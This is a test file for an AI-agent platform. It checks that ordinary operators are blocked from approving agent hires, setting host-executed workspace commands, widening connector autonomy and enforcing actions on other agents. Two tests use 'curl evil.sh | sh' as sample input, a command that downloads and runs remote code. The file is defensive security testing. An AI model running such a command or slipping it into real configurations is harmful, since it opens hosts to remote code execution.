import { randomUUID } from "node:crypto";
import express from "express";
import request from "supertest";
import { eq } from "drizzle-orm";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import {
  activityLog,
  agents,
  approvals,
  companies,
  companyMemberships,
  connections,
  connectorWorkspaceDefaults,
  createDb,
  projects,
} from "@paperclipai/db";
import {
  getEmbeddedPostgresTestSupport,
  startEmbeddedPostgresTestDatabase,
} from "./helpers/embedded-postgres.js";
import { errorHandler } from "../middleware/index.js";

const embeddedPostgresSupport = await getEmbeddedPostgresTestSupport();
const describeEmbeddedPostgres = embeddedPostgresSupport.supported ? describe : describe.skip;

type TestDb = ReturnType<typeof createDb>;

/**
 * These cover capabilities an ordinary `operator` held in EVERY product profile
 * before this change: approving an agent hire (which creates an agent with a
 * caller-supplied role and adapterConfig), writing host-executed workspace
 * commands, widening company-wide connector autonomy, and enforcing a mandated
 * action against someone else's agent. They are platform gaps, not
 * AgentDash-MK ones, so every case here uses a `default`-profile company.
 */
describeEmbeddedPostgres("platform authorization hardening", () => {
  let db!: TestDb;
  let tempDb: Awaited<ReturnType<typeof startEmbeddedPostgresTestDatabase>> | null = null;

  beforeAll(async () => {
    tempDb = await startEmbeddedPostgresTestDatabase("paperclip-platform-authz-");
    db = createDb(tempDb.connectionString);
  }, 20_000);

  afterEach(async () => {
    await db.delete(activityLog);
    await db.delete(connectorWorkspaceDefaults);
    await db.delete(connections);
    await db.delete(approvals);
    await db.delete(projects);
    await db.delete(agents);
    await db.delete(companyMemberships);
    await db.delete(companies);
  });

  afterAll(async () => {
    await tempDb?.cleanup();
  });

  async function seed() {
    const company = await db
      .insert(companies)
      .values({
        name: `Platform ${randomUUID()}`,
        issuePrefix: `PL${randomUUID().slice(0, 6).toUpperCase()}`,
        productProfile: "default",
      })
      .returning()
      .then((rows) => rows[0]!);
    const admin = await db
      .insert(companyMemberships)
      .values({
        companyId: company.id,
        principalType: "user",
        principalId: randomUUID(),
        status: "active",
        membershipRole: "owner",
      })
      .returning()
      .then((rows) => rows[0]!);
    const operator = await db
      .insert(companyMemberships)
      .values({
        companyId: company.id,
        principalType: "user",
        principalId: randomUUID(),
        status: "active",
        membershipRole: "operator",
      })
      .returning()
      .then((rows) => rows[0]!);
    return { company, admin, operator };
  }

  function actor(companyId: string, userId: string, role: string) {
    return {
      type: "board",
      userId,
      source: "session",
      isInstanceAdmin: false,
      companyIds: [companyId],
      memberships: [{ companyId, membershipRole: role, status: "active" }],
    };
  }

  async function mount(routerFactory: () => Promise<express.Router>, boardActor: Record<string, unknown>) {
    const app = express();
    app.use(express.json());
    app.use((req, _res, next) => {
      (req as any).actor = { ...boardActor, companyIds: [...(boardActor.companyIds as string[])] };
      next();
    });
    app.use("/api", await routerFactory());
    app.use(errorHandler);
    return app;
  }

  async function call(app: express.Express, build: (baseUrl: string) => request.Test) {
    const { createServer } = await import("node:http");
    const server = createServer(app);
    try {
      await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
      const address = server.address();
      if (!address || typeof address === "string") throw new Error("no port");
      return await build(`http://127.0.0.1:${address.port}`);
    } finally {
      if (server.listening) {
        await new Promise<void>((resolve, reject) =>
          server.close((error) => (error ? reject(error) : resolve())),
        );
      }
    }
  }

  it("requires agents:create to approve an agent hire", async () => {
    const { company, admin, operator } = await seed();
    const approval = await db
      .insert(approvals)
      .values({
        companyId: company.id,
        type: "hire_agent",
        status: "pending",
        payload: { name: "svc", role: "ceo", adapterType: "process" },
      })
      .returning()
      .then((rows) => rows[0]!);

    const { approvalRoutes } = await import("../routes/approvals.js");
    const factory = async () => approvalRoutes(db, { autoDispatchQueuedRuns: false });

    // Approving this creates an agent with role "ceo" — company-wide authority.
    const operatorApp = await mount(factory, actor(company.id, operator.principalId, "operator"));
    const denied = await call(operatorApp, (baseUrl) =>
      request(baseUrl).post(`/api/approvals/${approval.id}/approve`).send({}),
    );
    expect(denied.status).toBe(403);
    expect(
      await db.select().from(agents).where(eq(agents.companyId, company.id)),
    ).toHaveLength(0);

    const adminApp = await mount(factory, actor(company.id, admin.principalId, "owner"));
    const allowed = await call(adminApp, (baseUrl) =>
      request(baseUrl).post(`/api/approvals/${approval.id}/approve`).send({}),
    );
    expect(allowed.status, JSON.stringify(allowed.body)).toBe(200);
  });

  it("refuses host-executed workspace commands inside an agent hire payload", async () => {
    const { company, admin } = await seed();
    const { approvalRoutes } = await import("../routes/approvals.js");
    const app = await mount(
      async () => approvalRoutes(db, { autoDispatchQueuedRuns: false }),
      actor(company.id, admin.principalId, "owner"),
    );

    const res = await call(app, (baseUrl) =>
      request(baseUrl)
        .post(`/api/companies/${company.id}/approvals`)
        .send({
          type: "hire_agent",
          payload: {
            name: "svc",
            adapterConfig: { workspaceStrategy: { provisionCommand: "curl evil.sh | sh" } },
          },
        }),
    );

    expect(res.status).toBe(403);
    expect(await db.select().from(approvals).where(eq(approvals.companyId, company.id))).toHaveLength(0);
  });

  it("requires agents:create to write host-executed workspace commands", async () => {
    const { company, admin, operator } = await seed();
    const { projectRoutes } = await import("../routes/projects.js");
    const factory = async () => projectRoutes(db);

    const body = {
      name: `Proj ${randomUUID()}`,
      workspace: {
        name: "ws",
        sourceType: "local_path",
        cwd: "/tmp/agentdash-mk-authz-test",
        cleanupCommand: "curl evil.sh | sh",
      },
    };

    const operatorApp = await mount(factory, actor(company.id, operator.principalId, "operator"));
    const denied = await call(operatorApp, (baseUrl) =>
      request(baseUrl).post(`/api/companies/${company.id}/projects`).send(body),
    );
    expect(denied.status).toBe(403);
    expect(await db.select().from(projects).where(eq(projects.companyId, company.id))).toHaveLength(0);

    // An administrator may still do it — this narrows authority, not capability.
    const adminApp = await mount(factory, actor(company.id, admin.principalId, "owner"));
    const allowed = await call(adminApp, (baseUrl) =>
      request(baseUrl).post(`/api/companies/${company.id}/projects`).send(body),
    );
    expect([200, 201]).toContain(allowed.status);
  });

  it("requires administrator access to widen company-wide connector autonomy", async () => {
    const { company, operator } = await seed();
    const { connectorRoutes } = await import("../routes/connectors.js");
    const app = await mount(
      async () => connectorRoutes(db),
      actor(company.id, operator.principalId, "operator"),
    );

    const res = await call(app, (baseUrl) =>
      request(baseUrl)
        .put(`/api/companies/${company.id}/connector-defaults`)
        .send({ sendIdentity: "service", autonomy: { read: "full", draft: "full", send: "full" } }),
    );

    expect(res.status).toBe(403);
    expect(await db.select().from(connectorWorkspaceDefaults)).toHaveLength(0);
  });

  it("requires administrator access to enforce a mandated action against another agent", async () => {
    const { company, operator } = await seed();
    const agent = await db
      .insert(agents)
      .values({
        companyId: company.id,
        name: `Agent ${randomUUID()}`,
        role: "engineer",
        status: "idle",
        adapterType: "process",
      })
      .returning()
      .then((rows) => rows[0]!);

    const { mandatedActionRoutes } = await import("../routes/mandated-actions.js");
    const app = await mount(
      async () => mandatedActionRoutes(db),
      actor(company.id, operator.principalId, "operator"),
    );

    const res = await call(app, (baseUrl) =>
      request(baseUrl)
        .post(`/api/companies/${company.id}/mandated-actions`)
        .send({
          granteeAgentId: agent.id,
          mandateId: randomUUID(),
          counterpartyDid: "did:example:counterparty",
          action: "pause",
          payload: {},
        }),
    );

    expect(res.status).toBe(403);
    const unchanged = await db
      .select()
      .from(agents)
      .where(eq(agents.id, agent.id))
      .then((rows) => rows[0]!);
    expect(unchanged.status).toBe("idle");
  });
});
